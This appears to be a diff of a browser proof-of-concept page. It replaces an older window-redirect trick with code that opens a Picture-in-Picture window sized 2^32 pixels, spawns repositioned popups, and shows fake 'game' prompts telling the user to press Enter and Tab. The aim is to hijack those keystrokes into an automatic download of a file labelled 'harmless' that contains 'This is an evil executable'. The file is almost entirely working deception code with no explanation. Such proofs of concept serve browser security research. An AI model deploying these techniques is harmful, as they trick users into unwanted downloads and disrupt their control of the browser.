@@ -1,41 +1,69 @@
-<body>
-<a id="test" href="https://www.amazon.com/" onclick="foo()">TAP</a>
-<h1 id="status"></h1>
-</body>
+<button autofocus onclick="start()">Press 2x enter to play the game</button>
+
+
+<pre id="contents"></pre>
 
 <script>
-var w;
-var t;
 
-if (location.href.indexOf("fake") !== -1) {
-    document.body.innerHTML = "<h1 id='halo'>halo</h1>";
+
+const pipOpen = async () => {
+  pipWindow = await documentPictureInPicture.requestWindow({
+    width: Math.pow(2,32),
+    height: Math.pow(2,32),
+  });
+  pipWindow.document.body.innerHTML = `
+  <button autofocus onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
+
+  <script>
+ 
+  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
+  popup.resizeTo(200,200);
+  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
+  //setTimeout('window.close()',600);
+    var count = 4;
+
+	function counter() {
+
+		if ( count > 0 )
+		{
+			--count;
+			var t2 = setTimeout( counter, 1000 );
+
+			document.body.innerHTML = "<p>Please wait.... Press " + "Tab: "+count+"</p>"
+		}
+		else
+		{
+			clearTimeout(t2);
+
+			document.body.innerHTML = "<p>Press " + "Enter</p>"
+		}
+	}
+
+     var countdown_timeout = counter();
+  
+  
+
+  <${'/'}script>
+  `;
+};
+
+function download(data, filename, type) {
+  const file = new Blob([data], {type: type});
+  const a = document.createElement("a");
+  const url = window.URL.createObjectURL(file);
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
 }
 
-function foo() {
-    document.getElementById("test").href = "#";
-
-    w = window.open("?fake", "_blank");
-
-    // interval lebih manusiawi
-    t = setInterval(bar, 50);
+function start() {
+    pipOpen();
 }
 
-function bar() {
-    try {
-        // cek apakah window masih same-origin
-        if (w.location.href.indexOf("fake") !== -1) {
+if (window.name == "popup-write") {
+  download("This is an evil executable", "harmless");
+ 
+} 
 
-            document.getElementById("status").textContent = "Redirecting...";
-
-            // redirect sekali saja
-            w.location.href = "https://www.google.com:9090";
-
-            clearInterval(t);
-        }
-
-    } catch (e) {
-        // Begitu cross-origin terjadi, STOP.
-        clearInterval(t);
-    }
-}
 </script>
